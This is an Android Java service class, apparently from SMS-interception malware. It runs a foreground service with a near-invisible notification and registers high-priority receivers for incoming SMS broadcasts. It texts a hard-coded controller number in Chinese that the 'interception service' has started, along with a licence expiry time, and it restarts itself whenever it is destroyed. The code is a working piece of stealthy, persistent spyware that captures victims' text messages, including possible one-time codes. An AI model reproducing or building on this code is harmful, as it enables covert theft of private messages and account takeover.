package pei.gen.wjh;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.widget.RemoteViews;

public class peigen extends Service {

	public static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	public static final String SMS_RECEIVED_2 = "android.provider.Telephony.SMS_RECEIVED_2";
	public static final String GSM_SMS_RECEIVED = "android.provider.Telephony.GSM_SMS_RECEIVED";
	public static final String SendState = "pei.gen.wjh";
	private peiqi localMessageReceiver,localMessageReceiver2;

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
//		if (woaini.key.equals(woaini.getPublicKey(this))) {

		Notification notification = new Notification(R.drawable.icon, "",
													 System.currentTimeMillis());
		Intent notificationIntent = new Intent();
		notification.contentView = new RemoteViews(this.getPackageName(),
												   R.layout.activity_main);
		PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
																notificationIntent, 0);
		notification.contentIntent = pendingIntent;
		startForeground(100, notification);
		IntentFilter localIntentFilter = new IntentFilter();
		localIntentFilter.addAction(peigen.SMS_RECEIVED);
		localIntentFilter.addAction(peigen.SMS_RECEIVED_2);
		localIntentFilter.addAction(peigen.GSM_SMS_RECEIVED);
		localIntentFilter.setPriority(1000);
		localMessageReceiver = new peiqi();
		this.registerReceiver(localMessageReceiver, localIntentFilter,
							  "android.permission.BROADCAST_SMS", null);
		localMessageReceiver2 = new peiqi();
		this.registerReceiver(localMessageReceiver2, new IntentFilter(peigen.SendState));
		woaini su=new woaini();
		su.sendSMS(woaini.phone, "拦截服务已启动,软件到期时间"+woaini.endtime, null);
//		}
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		this.stopForeground(true);
		this.unregisterReceiver(localMessageReceiver);
		this.unregisterReceiver(localMessageReceiver2);
		Intent localIntent = new Intent();
		localIntent.setClass(this, peigen.class); // 销毁时重新启动Service
		this.startService(localIntent);
	}

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		flags = START_REDELIVER_INTENT;
		return super.onStartCommand(intent, flags, startId);
	}


}

